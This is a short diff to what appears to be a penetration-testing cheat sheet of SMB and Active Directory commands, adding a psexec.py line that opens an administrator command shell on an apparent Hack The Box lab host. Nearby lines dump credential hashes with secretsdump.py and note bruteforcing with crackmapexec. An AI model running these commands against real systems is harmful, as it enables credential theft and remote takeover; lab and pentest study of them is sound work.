@@ -116,6 +116,7 @@ smbmap -H [IP_ADDR] -u [USERNAME]
 smbmap -R [SHARE] -H [IP_ADDR]
 lookupsid.py anonymous@$[IP_ADDR]   # with IPC$ readonly permission
 secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP_ADDR]   # with ADMIN$ write permission
+psexec.py -dc-ip [IP_ADDR] active.htb/administrator:[PASSWORD]@[IP_ADDR] cmd  # admin privilege; with ADMIN$ write permission
 crackmapexec smb [IP_ADDR] --shares
 crackmapexec smb [IP_ADDR] -d [domain] -u [USERNAME] -p [PASSWORD] --shares   # can be use for bruteforcing too
 enum4linux -a [IP_ADDR]
